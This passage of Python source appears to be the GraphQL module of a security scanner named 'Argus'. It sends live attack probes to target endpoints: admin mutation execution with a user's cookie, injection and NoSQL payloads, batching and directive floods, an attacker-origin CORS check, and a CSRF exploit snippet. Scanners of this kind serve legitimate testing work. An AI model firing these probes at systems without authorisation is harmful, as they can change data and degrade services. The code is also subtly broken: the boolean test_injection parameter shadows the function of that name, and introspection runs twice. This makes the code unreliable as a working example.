    # v3 fix: previously `schema.get("mutationType", {}).get("name")` → AttributeError
    mutation_type_name = _schema_type_name(ep.schema, "mutationType")
    if not mutation_type_name:
        return findings

    mutations: list[dict] = []
    for f in _root_mutation_fields(ep.schema):
        if not isinstance(f, dict):
            continue
        fname = (f.get("name") or "").lower()
        if any(pat in fname for pat in SENSITIVE_MUTATION_PATTERNS):
            mutations.append({
                "mutation": f.get("name"),
                "args": [a.get("name") for a in _safe_list(f, "args") if isinstance(a, dict)],
            })

    if not mutations:
        return findings

    if user_cookie:
        headers = {"Cookie": user_cookie}
        for m in mutations[:5]:
            args = ", ".join(f'{a}: "1"' for a in (m.get("args") or [])[:2])
            q = f'mutation {{ {m["mutation"]}({args}) {{ __typename }} }}'
            r = session.post_json(ep.url, {"query": q}, headers=headers)
            if r and _is_graphql_response(r):
                try:
                    data = r.json()
                    if _safe_dict(data, "data") and not data.get("errors"):
                        findings.append(GraphQLFinding(
                            endpoint=ep.url, vuln_type="graphql_bfla_confirmed",
                            category="authz", severity="HIGH", confidence=75,
                            engine=ep.engine,
                            evidence=f"Regular user executed mutation {m['mutation']}",
                            query_payload=q,
                            response_snippet=_body_text(r, 300),
                            auth_enabled=auth_on, first_seen=now,
                        ))
                except Exception:
                    pass
    else:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_bfla_surface",
            category="authz", severity="MEDIUM", confidence=50,
            engine=ep.engine,
            evidence=f"{len(mutations)} admin-like mutation(s); supply user_cookie to confirm",
            details={"mutations": mutations[:50]},
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — INJECTION TESTING (root Query args only)
# ═════════════════════════════════════════════════════════════════════════════

def test_injection(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    # v3 correctness fix: only root Query fields can be invoked from a top-level query
    args: list[dict] = []
    for f in _root_query_fields(ep.schema):
        if not isinstance(f, dict):
            continue
        for arg in _safe_list(f, "args"):
            if not isinstance(arg, dict):
                continue
            atype = _safe_type_name(arg.get("type")) or ""
            if atype in ("String", "ID", "URL", "JSON"):
                args.append({
                    "type":  "Query",
                    "field": f.get("name"),
                    "arg":   arg.get("name"),
                })

    if not args:
        return findings

    for arg in args[:5]:
        for cls, payloads in INJECTION_PAYLOADS.items():
            for payload in payloads[:2]:
                escaped = payload.replace("\\", "\\\\").replace('"', '\\"')
                q = f'{{ {arg["field"]}({arg["arg"]}: "{escaped}") {{ __typename }} }}'
                r = session.post_json(ep.url, {"query": q})
                if not r:
                    continue
                body = r.text or ""

                has_pii, hits = _has_pii(body)
                if has_pii:
                    findings.append(GraphQLFinding(
                        endpoint=ep.url,
                        vuln_type=f"graphql_injection_{cls}_confirmed",
                        category="injection",
                        severity="CRITICAL",
                        confidence=90,
                        engine=ep.engine,
                        evidence=f"{cls} payload on {arg['field']}({arg['arg']}) leaked: {', '.join(hits[:3])}",
                        query_payload=q,
                        response_snippet=_body_text(r, 300),
                        details={"class": cls, "payload": payload, "leaked": hits},
                        auth_enabled=auth_on, first_seen=now,
                    ))
                    break

                for pattern in ERROR_LEAK_PATTERNS:
                    if re.search(pattern, body, re.I):
                        findings.append(GraphQLFinding(
                            endpoint=ep.url,
                            vuln_type=f"graphql_injection_{cls}_error",
                            category="injection",
                            severity="HIGH",
                            confidence=75,
                            engine=ep.engine,
                            evidence=f"{cls} payload on {arg['field']}({arg['arg']}) triggered error leak",
                            query_payload=q,
                            response_snippet=_body_text(r, 300),
                            details={"class": cls, "payload": payload, "pattern": pattern},
                            auth_enabled=auth_on, first_seen=now,
                        ))
                        break

    # ── NoSQLi via JSON variable ────────────────────────────────────────────
    for arg in args[:3]:
        if (arg.get("type") or "").lower() not in ("json", "string"):
            continue
        for payload in ["{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}"]:
            try:
                variables = {arg["arg"]: json.loads(payload)}
            except Exception:
                continue
            q = f'query Test($v: {arg["type"]}) {{ {arg["field"]}({arg["arg"]}: $v) {{ __typename }} }}'
            r = session.post_json(ep.url, {"query": q, "variables": variables})
            if not r:
                continue
            for pattern in ERROR_LEAK_PATTERNS + ["mongo", "cast to ObjectId"]:
                if re.search(pattern, r.text or "", re.I):
                    findings.append(GraphQLFinding(
                        endpoint=ep.url,
                        vuln_type="graphql_injection_nosqli_variable",
                        category="injection", severity="HIGH", confidence=80,
                        engine=ep.engine,
                        evidence=f"NoSQLi via variable on {arg['field']}({arg['arg']}): {payload}",
                        query_payload=q,
                        response_snippet=_body_text(r, 300),
                        details={"arg": arg, "payload": payload},
                        auth_enabled=auth_on, first_seen=now,
                    ))
                    break

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — QUERY ABUSE
# ═════════════════════════════════════════════════════════════════════════════

def test_batching(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    array_body = [{"query": DISCOVERY_QUERY} for _ in range(MAX_BATCH_SIZE)]
    r = session.post_json(ep.url, array_body)
    if r and r.status_code == 200:
        try:
            data = r.json()
            if isinstance(data, list) and len(data) > 1:
                findings.append(GraphQLFinding(
                    endpoint=ep.url, vuln_type="graphql_array_batching",
                    category="dos", severity="MEDIUM", confidence=85,
                    engine=ep.engine,
                    evidence=f"Array batching accepted {len(data)} operations in one request",
                    details={"batch_size": len(data)},
                    auth_enabled=auth_on, first_seen=now,
                ))
        except Exception:
            pass

    aliases = " ".join(f'a{i}: __typename' for i in range(MAX_ALIAS_COUNT))
    q = f"{{ {aliases} }}"
    r = session.post_json(ep.url, {"query": q})
    if r and _is_graphql_response(r):
        try:
            data_obj = _safe_dict(r.json(), "data")
            if len(data_obj) >= MAX_ALIAS_COUNT:
                findings.append(GraphQLFinding(
                    endpoint=ep.url, vuln_type="graphql_alias_batching",
                    category="dos", severity="MEDIUM", confidence=80,
                    engine=ep.engine,
                    evidence=f"Alias batching accepted {len(data_obj)} aliases in one request",
                    query_payload=q,
                    details={"alias_count": len(data_obj)},
                    auth_enabled=auth_on, first_seen=now,
                ))
        except Exception:
            pass

    return findings


def test_depth(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    t0 = time.monotonic()
    baseline = session.post_json(ep.url, {"query": DISCOVERY_QUERY})
    baseline_time = time.monotonic() - t0
    if not baseline or not _is_graphql_response(baseline):
        return findings

    deep_query = _build_deep_query(ep.schema, MAX_DEPTH_PROBE)
    if not deep_query:
        return findings

    t0 = time.monotonic()
    deep = session.post_json(ep.url, {"query": deep_query})
    deep_time = time.monotonic() - t0
    if not deep or not _is_graphql_response(deep):
        return findings

    delta = deep_time - baseline_time
    if delta >= DEPTH_IMPACT_THRESHOLD:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_depth_impact",
            category="dos", severity="MEDIUM", confidence=70,
            engine=ep.engine,
            evidence=f"Depth {MAX_DEPTH_PROBE} took {deep_time:.2f}s vs baseline {baseline_time:.2f}s (Δ {delta:.2f}s)",
            query_payload=deep_query[:500],
            details={
                "depth": MAX_DEPTH_PROBE,
                "baseline": round(baseline_time, 3),
                "deep": round(deep_time, 3),
                "delta": round(delta, 3),
            },
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


def test_negative_limit(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    for f in _root_query_fields(ep.schema):
        if not isinstance(f, dict):
            continue
        for arg in _safe_list(f, "args"):
            if not isinstance(arg, dict):
                continue
            aname = (arg.get("name") or "").lower()
            atype = _safe_type_name(arg.get("type")) or ""
            if aname in ("take", "limit", "first") and atype == "Int":
                q = f'{{ {f.get("name")}({arg.get("name")}: -1) {{ __typename }} }}'
                r = session.post_json(ep.url, {"query": q})
                if r and _is_graphql_response(r):
                    try:
                        data = r.json()
                        if _safe_dict(data, "data") and not data.get("errors"):
                            findings.append(GraphQLFinding(
                                endpoint=ep.url,
                                vuln_type="graphql_negative_limit_bypass",
                                category="dos", severity="MEDIUM", confidence=60,
                                engine=ep.engine,
                                evidence=f"{f.get('name')}({arg.get('name')}: -1) accepted — bypasses max cap",
                                query_payload=q,
                                response_snippet=_body_text(r, 300),
                                details={"field": f.get("name"), "arg": arg.get("name")},
                                auth_enabled=auth_on, first_seen=now,
                            ))
                    except Exception:
                        pass
                break

    return findings


def test_directive_flood(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    directives = " ".join(["@include(if: true)"] * MAX_DIRECTIVE_FLOOD)
    q = f'{{ __typename {directives} }}'
    t0 = time.monotonic()
    r = session.post_json(ep.url, {"query": q})
    elapsed = time.monotonic() - t0

    if r is None:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_directive_flood_crash",
            category="dos", severity="HIGH", confidence=60,
            engine=ep.engine,
            evidence=f"Connection dropped after {MAX_DIRECTIVE_FLOOD} @include directives (potential CVE-2024-47614)",
            query_payload=q[:500],
            details={"flood_size": MAX_DIRECTIVE_FLOOD, "elapsed": round(elapsed, 2)},
            auth_enabled=auth_on, first_seen=now,
        ))
    elif elapsed > 3.0:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_directive_flood_slow",
            category="dos", severity="MEDIUM", confidence=55,
            engine=ep.engine,
            evidence=f"{MAX_DIRECTIVE_FLOOD} directives caused {elapsed:.1f}s delay",
            query_payload=q[:500],
            details={"flood_size": MAX_DIRECTIVE_FLOOD, "elapsed": round(elapsed, 2)},
            auth_enabled=auth_on, first_seen=now,
        ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — CSRF / TRANSPORT
# ═════════════════════════════════════════════════════════════════════════════

def test_csrf_cors(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    if ep.get_supported:
        mut_test = 'mutation { __typename }'
        r = session.get(ep.url, params={"query": mut_test})
        mutation_via_get = bool(
            r and _is_graphql_response(r) and "errors" not in (r.json() or {})
        )
        findings.append(GraphQLFinding(
            endpoint=ep.url,
            vuln_type="graphql_get_mutation_accept" if mutation_via_get else "graphql_get_query_accept",
            category="csrf",
            severity="HIGH" if mutation_via_get else "MEDIUM",
            confidence=85 if mutation_via_get else 60,
            engine=ep.engine,
            evidence=("GET accepts mutations — CSRF via simple <img> tag" if mutation_via_get
                      else "GET accepts queries — potential CSRF read surface"),
            details={"get_url": f"{ep.url}?query={urllib.parse.quote(mut_test)}"},
            auth_enabled=auth_on, first_seen=now,
        ))

    if ep.text_plain_supported:
        findings.append(GraphQLFinding(
            endpoint=ep.url, vuln_type="graphql_text_plain_csrf_bypass",
            category="csrf", severity="HIGH", confidence=80,
            engine=ep.engine,
            evidence="Endpoint accepts Content-Type: text/plain — CSRF preflight bypass",
            details={
                "exploit": "fetch(url,{method:'POST',credentials:'include',"
                           "headers:{'Content-Type':'text/plain'},"
                           "body:JSON.stringify({query:'mutation{...}'})})",
            },
            auth_enabled=auth_on, first_seen=now,
        ))

    attacker_origin = "https://evil-argus.example"
    r = session.request(
        "OPTIONS", ep.url,
        headers={"Origin": attacker_origin, "Access-Control-Request-Method": "POST"},
    )
    if r:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if attacker_origin in acao and acac:
            ep.cors_reflects_creds = True
            findings.append(GraphQLFinding(
                endpoint=ep.url, vuln_type="graphql_cors_credentialed",
                category="transport", severity="HIGH", confidence=90,
                engine=ep.engine,
                evidence="CORS reflects attacker origin with credentials",
                details={"acao": acao, "acac": True},
                auth_enabled=auth_on, first_seen=now,
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — MULTIPART UPLOAD
# ═════════════════════════════════════════════════════════════════════════════

MULTIPART_BOUNDARY = "----ArgusGraphQLBoundary"


def _build_multipart_body(query: str) -> bytes:
    body = (
        f"--{MULTIPART_BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="operations"\r\n\r\n'
        f'{json.dumps({"query": query})}\r\n'
        f"--{MULTIPART_BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="map"\r\n\r\n'
        '{"0":["variables.file"]}\r\n'
        f"--{MULTIPART_BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="0"; filename="argus.txt"\r\n'
        'Content-Type: text/plain\r\n\r\n'
        "argus-test-file\r\n"
        f"--{MULTIPART_BOUNDARY}--\r\n"
    )
    return body.encode()


def test_multipart_upload(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    query = "mutation($file: Upload!) { __typename }"
    body = _build_multipart_body(query)

    r = session.post_raw(
        ep.url, body,
        f"multipart/form-data; boundary={MULTIPART_BOUNDARY}",
    )
    if r and r.status_code < 500:
        try:
            errs = " ".join(_errors(r)).lower()
            if "upload" in errs or _is_graphql_response(r):
                ep.multipart_supported = True
                findings.append(GraphQLFinding(
                    endpoint=ep.url, vuln_type="graphql_multipart_upload_surface",
                    category="upload", severity="MEDIUM", confidence=55,
                    engine=ep.engine,
                    evidence="Endpoint accepts multipart GraphQL upload requests",
                    query_payload=query,
                    response_snippet=_body_text(r, 300),
                    details={
                        "test_file": "argus-test-file",
                        "note": "Test file-upload bypasses: path traversal in filename, "
                                "content-type trust, size limits",
                    },
                    auth_enabled=auth_on, first_seen=now,
                ))
        except Exception:
            pass

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — WEBSOCKET SUBSCRIPTIONS
# ═════════════════════════════════════════════════════════════════════════════

def test_websocket_subscriptions(
    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
) -> list[GraphQLFinding]:
    findings: list[GraphQLFinding] = []
    if not ep.schema:
        return findings

    # Safe: _safe_dict handles subscriptionType: null
    sub_type = _safe_dict(ep.schema, "subscriptionType")
    sub_name = sub_type.get("name") if sub_type else None
    if not sub_name:
        return findings
    now = datetime.now(timezone.utc).isoformat()

    findings.append(GraphQLFinding(
        endpoint=ep.websocket_url or ep.url,
        vuln_type="graphql_websocket_subscription_surface",
        category="subscription", severity="MEDIUM", confidence=50,
        engine=ep.engine,
        evidence=f"Schema exposes subscription type '{sub_name}' — test WS auth manually",
        details={
            "subscription_type": sub_name,
            "ws_url": ep.websocket_url or _discover_ws_url(ep.url),
            "test_command": f"wscat -c {ep.websocket_url or _discover_ws_url(ep.url)}",
        },
        auth_enabled=auth_on, first_seen=now,
    ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  DB SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[GraphQLFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not available")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB is False")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED is False")
        return
    if not getattr(DB, "available", False):
        log.warning("  DB sync: bridge client not ready")
        return

    try:
        payloads = [f.to_dict() for f in findings]
        result = DB.upsert_graphql_findings(scan_id, payloads)
        if result is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {result} GraphQL finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_graphql_audit(
    live_urls_file: Path,
    outdir: Path,
    *,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    headers: Optional[dict] = None,
    user_a_cookie: Optional[str] = None,
    user_b_cookie: Optional[str] = None,
    user_b_id: Optional[str] = None,
    test_authz: bool = True,
    test_injection: bool = True,
    test_query_abuse: bool = True,
    test_csrf: bool = True,
    test_upload: bool = True,
    test_subscriptions: bool = True,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _gql_settings()
    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = settings["timeout"]

    base_urls = _load_urls(live_urls_file)
    outdir.mkdir(parents=True, exist_ok=True)

    auth_on = bool(_cfg("AUTH_ENABLED", False))
    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)

    log.info(f"  Input  : {len(base_urls)} URL(s) from {live_urls_file.name}")
    log.info(f"  Config : rate_limit={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"           source: MODULE_RATE_LIMITS['graphql']")

    if cfg_hdrs:
        log.info(f"  Headers: {len(cfg_hdrs)} configured, applied to every request")
        for k, v in list(cfg_hdrs.items())[:3]:
            log.info(f"           · {k}: {v[:40]}{'…' if len(v) > 40 else ''}")
    if user_a_cookie:
        log.info("  Auth A : supplied (BOLA/BFLA testing enabled)")
    elif auth_on:
        log.info("  Auth   : request.txt session (BOLA/BFLA limited)")
    else:
        log.info("  Auth   : disabled")
    log.info("")

    if not base_urls:
        log.warning("  No URLs — writing empty report")
        return _write_empty_report(outdir, live_urls_file, start)

    session = RateLimitedSession(rate_limit=eff_rate, timeout=eff_timeout)
    try:
        # ── Phase 1 ─────────────────────────────────────────────────────────
        log.info("  Phase 1 — GraphQL endpoint discovery")
        endpoints = _run_phase(
            "endpoint-discovery", discover_graphql_endpoints, session, base_urls,
        )
        if not endpoints:
            log.warning("  No GraphQL endpoints discovered — writing empty report")
            return _write_empty_report(outdir, live_urls_file, start, len(base_urls))
        log.info(f"    Discovered {len(endpoints)} endpoint(s)")
        log.info("")

        all_findings: list[GraphQLFinding] = []
        schema_dumps: dict[str, dict] = {}

        for ep in endpoints:
            log.info(f"  Auditing {ep.url}")

            # Phase 2 — fingerprint
            ep.engine = _run_phase("fingerprint", fingerprint_engine, session, ep)[0] \
                if False else fingerprint_engine(session, ep)  # no-op guard
            log.info(f"    Engine   : {ep.engine}")

            # Phase 3 — introspection
            schema = _run_phase("introspection", run_introspection, session, ep)
            if schema is None:
                schema = None  # _run_phase returns list; adjust
            # NOTE: _run_phase wraps lists; run_introspection returns Optional[dict].
            # We call it directly with try/except to preserve the dict return type.
            try:
                schema = run_introspection(session, ep)
            except Exception as e:
                log.warning(f"    Phase 'introspection' failed: {e}")
                log.debug(traceback.format_exc())
                schema = None

            if schema:
                schema_dumps[ep.url] = schema
                log.info("    Schema   : introspectable")
                schema_findings = _run_phase(
                    "schema-analysis", analyze_schema, ep, schema, auth_on,
                )
                all_findings.extend(schema_findings)
                log.info(f"    Schema findings: {len(schema_findings)}")
            else:
                log.info("    Schema   : not introspectable")
                bypass_findings = _run_phase(
                    "introspection-bypass", bypass_introspection, session, ep, auth_on,
                )
                all_findings.extend(bypass_findings)
                log.info(f"    Introspection bypass findings: {len(bypass_findings)}")

            # Phase 5 — authz
            if test_authz:
                bola   = _run_phase("bola",   test_bola,   session, ep, user_a_cookie, user_b_id, auth_on)
                bfla   = _run_phase("bfla",   test_bfla,   session, ep, user_a_cookie, auth_on)
                relay  = _run_phase("relay",  test_relay_node_idor, session, ep, auth_on)
                nested = _run_phase("nested", test_nested_object_authz, session, ep, auth_on)
                all_findings.extend(bola + bfla + relay + nested)
                log.info(f"    Authz findings: {len(bola) + len(bfla) + len(relay) + len(nested)}")

            # Phase 6 — injection
            if test_injection:
                inj = _run_phase("injection", test_injection, session, ep, auth_on)
                all_findings.extend(inj)
                log.info(f"    Injection findings: {len(inj)}")

            # Phase 7 — query abuse
            if test_query_abuse:
                batch  = _run_phase("batching",        test_batching,        session, ep, auth_on)
                depth  = _run_phase("depth",           test_depth,           session, ep, auth_on)
                neg    = _run_phase("negative-limit",  test_negative_limit,  session, ep, auth_on)
                flood  = _run_phase("directive-flood", test_directive_flood, session, ep, auth_on)
                all_findings.extend(batch + depth + neg + flood)
                log.info(f"    Query-abuse findings: {len(batch) + len(depth) + len(neg) + len(flood)}")

            # Phase 8 — CSRF / CORS
            if test_csrf:
                csrf = _run_phase("csrf-cors", test_csrf_cors, session, ep, auth_on)
                all_findings.extend(csrf)
                log.info(f"    CSRF/CORS findings: {len(csrf)}")

            # Phase 9 — upload
            if test_upload:
                up = _run_phase("multipart", test_multipart_upload, session, ep, auth_on)
                all_findings.extend(up)
                log.info(f"    Upload findings: {len(up)}")

            # Phase 10 — subscriptions
            if test_subscriptions:
                sub = _run_phase("websocket", test_websocket_subscriptions, session, ep, auth_on)
                all_findings.extend(sub)
                log.info(f"    Subscription findings: {len(sub)}")

            log.info("")
    finally:
        try:
            session.session.close()
        except Exception:
            pass

    # ── Dedupe + sort ───────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[GraphQLFinding] = []
    for f in all_findings:
        key = (f.endpoint, f.vuln_type)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.endpoint))

    # ── Report ──────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_category: dict[str, int] = {}
    by_type: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_category[f.category] = by_category.get(f.category, 0) + 1
        by_type[f.vuln_type] = by_type.get(f.vuln_type, 0) + 1

    (outdir / "graphql_candidates.txt").write_text(
        "\n".join(
            f"{f.endpoint}\t{f.vuln_type}\t{f.category}\t{f.severity}\t{f.confidence}\t{f.evidence[:160]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "graphql_bola.txt").write_text(
        "\n".join(
            f"{f.endpoint}\t{f.evidence[:160]}"
            for f in deduped if "bola" in f.vuln_type or "bfla" in f.vuln_type
        ) + "\n"
    )
    (outdir / "graphql_query_abuse.txt").write_text(
        "\n".join(
            f"{f.endpoint}\t{f.vuln_type}\t{f.evidence[:160]}"
            for f in deduped if f.category == "dos"
        ) + "\n"
    )
    (outdir / "graphql_injection.txt").write_text(
        "\n".join(
            f"{f.endpoint}\t{f.vuln_type}\t{f.evidence[:160]}"
            for f in deduped if f.category == "injection"
        ) + "\n"
    )

    if schema_dumps:
        (outdir / "graphql_schema.json").write_text(json.dumps(schema_dumps, indent=2) + "\n")

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(live_urls_file),
        "auth_enabled": auth_on,
        "config": {
            "rate_limit":          eff_rate,
            "concurrency":         eff_conc,
            "timeout":             eff_timeout,
            "headers_count":       len(cfg_hdrs),
            "user_a_cookie_set":   user_a_cookie is not None,
            "user_b_id_set":       user_b_id is not None,
            "test_authz":          test_authz,
            "test_injection":      test_injection,
            "test_query_abuse":    test_query_abuse,
            "test_csrf":           test_csrf,
            "test_upload":         test_upload,
            "test_subscriptions":  test_subscriptions,
        },
        "endpoints": [ep.to_dict() for ep in endpoints],
        "totals": {
            "urls_input":       len(base_urls),
            "endpoints_found":  len(endpoints),
            "introspectable":   sum(1 for ep in endpoints if ep.introspectable),
            "total_findings":   len(deduped),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity": by_severity,
            "by_category": dict(sorted(by_category.items(), key=lambda kv: -kv[1])),
            "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
        },
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "graphql_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)
    else:
        log.info("")
        log.info("  DB sync  : deferred to main.py (no scan_id passed)")

    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<30} {len(deduped):>5} finding(s)")
    log.info(f"    graphql_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    graphql_bola.txt                {sum(1 for f in deduped if 'bola' in f.vuln_type or 'bfla' in f.vuln_type):>5} BOLA/BFLA finding(s)")
    log.info(f"    graphql_query_abuse.txt         {sum(1 for f in deduped if f.category == 'dos'):>5} DoS finding(s)")
    log.info(f"    graphql_injection.txt           {sum(1 for f in deduped if f.category == 'injection'):>5} injection finding(s)")
    if schema_dumps:
        log.info(f"    graphql_schema.json             {len(schema_dumps):>5} schema(s)")

    log.info("")
    log.info(
        f"  Severity : "
        f"CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  "
        f"MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_category:
        log.info("  Category : " + " · ".join(
            f"{k}({v})" for k, v in list(by_category.items())[:8]
        ))

    if deduped:
        log.info("")
        log.info("  Top findings:")
        for f in deduped[:12]:
            log.info(f"    [{f.severity:<8}] {f.category:<14} {f.vuln_type:<38} {f.endpoint[:50]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": bool(_cfg("AUTH_ENABLED", False)),
        "config": {},
        "endpoints": [],
        "totals": {
            "urls_input": total_input, "endpoints_found": 0,
            "introspectable": 0, "total_findings": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_category": {}, "by_type": {}},
        "findings": [],
    }
    path = outdir / "graphql_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("graphql_candidates.txt", "graphql_bola.txt",
                 "graphql_query_abuse.txt", "graphql_injection.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "live_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus GraphQL Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--cookie-a", help="User A session cookie for BOLA/BFLA")
    parser.add_argument("--cookie-b", help="User B session cookie")
    parser.add_argument("--user-b-id", help="User B's object identifier")
    parser.add_argument("--no-authz", action="store_true")
    parser.add_argument("--no-injection", action="store_true")
    parser.add_argument("--no-abuse", action="store_true")
    parser.add_argument("--no-csrf", action="store_true")
    parser.add_argument("--no-upload", action="store_true")
    parser.add_argument("--no-subscriptions", action="store_true")
    args = parser.parse_args()

    try:
        run_graphql_audit(
            args.input, args.output,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            user_a_cookie=args.cookie_a,
            user_b_cookie=args.cookie_b,
            user_b_id=args.user_b_id,
            test_authz=not args.no_authz,
            test_injection=not args.no_injection,
            test_query_abuse=not args.no_abuse,
            test_csrf=not args.no_csrf,
            test_upload=not args.no_upload,
            test_subscriptions=not args.no_subscriptions,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        log.debug(traceback.format_exc())
        sys.exit(1)
